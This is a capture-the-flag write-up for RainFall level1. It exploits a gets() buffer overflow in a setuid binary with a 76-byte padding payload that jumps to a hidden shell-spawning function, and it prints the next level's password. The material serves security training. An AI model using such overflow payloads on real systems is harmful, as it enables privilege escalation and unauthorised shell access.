# Level1

## Vulnerability
Buffer overflow in `gets()` function.

We list the files will show us level1 and the program wait an input and quit after press enter
```
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
level1@RainFall:~$ ./level1 

level1@RainFall:~$ ./level1 ss

level1@RainFall:~$ ./level1 
sss
level1@RainFall:~$ 
```
After converting the binary to a redable code "source.c"  we can see that there is two principal function : `main` and `run`.  

The `run` function use `fwrite` to display "Good... Wait what?\n" in the standard output stream (stdout). Then execute the shell command `/bin/sh` using `system`.  

The `main` function uses gets to receive user input who is vunerable to buffer overflow exploit.  


## Solution Steps

1. **Find the target function address**
```bash
   gdb level1
   (gdb) break run
   Breakpoint 1 at 0x804844a
```

2. **Calculate offset**
   - Buffer overflow requires 76 bytes of padding to reach return address

3. **Exploit**
```bash
   (python -c "print 'A'*76 + '\x4a\x84\x04\x08'"; cat) | ./level1
```
   - `'A'*76`: Fill buffer
   - `\x4a\x84\x04\x08`: Address of `run()` function (little-endian)
   - `cat`: Keep stdin open for interaction

4. **Get flag**
```bash
   whoami
    level2
   cat /home/user/level2/.pass
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Key Concept
Overwrite return address to jump to hidden `run()` function that spawns a shell.

